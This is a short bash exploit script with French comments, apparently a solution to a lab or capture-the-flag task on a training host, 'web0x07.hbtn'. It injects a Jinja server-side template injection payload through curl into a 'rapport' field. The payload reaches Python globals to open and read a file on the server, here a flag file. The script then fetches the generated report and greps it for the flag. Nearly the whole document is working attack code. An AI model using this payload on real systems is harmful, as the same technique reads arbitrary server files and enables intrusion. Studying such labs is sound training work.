#!/bin/bash

# URL de base
BASE_URL="http://web0x07.hbtn/task3"

# Payload Jinja pour lire le flag
PAYLOAD="{{ config.__class__.__init__.__globals__['open']('/etc/3-flag.txt').read() }}"

echo "[*] Injection du payload dans le champ 'rapport'..."
curl -sG "$BASE_URL/list_file" --data-urlencode "rapport=$PAYLOAD" > /dev/null

echo "[*] Récupération de la liste des fichiers..."
FILES=$(curl -s "$BASE_URL/list_file" | grep -oP '(?<=filename=)[^"]+')

# Récupérer le dernier fichier ajouté
LATEST_FILE=$(echo "$FILES" | sort | tail -n 1)

if [[ -z "$LATEST_FILE" ]]; then
  echo "[-] Aucun fichier trouvé."
  exit 1
fi

echo "[+] Fichier cible : $LATEST_FILE"

echo "[*] Lecture du contenu du rapport..."
RESPONSE=$(curl -s "$BASE_URL/view_file?filename=$LATEST_FILE")

echo "$RESPONSE" | grep -iE 'flag|htb|ctf|{.*}' && echo "[+] Flag trouvé :tada:" || echo "[-] Pas de flag dans ce fichier."

# Afficher les premières lignes pour debug
echo -e "\n--- Aperçu du fichier ---"
echo "$RESPONSE" | head -n 20
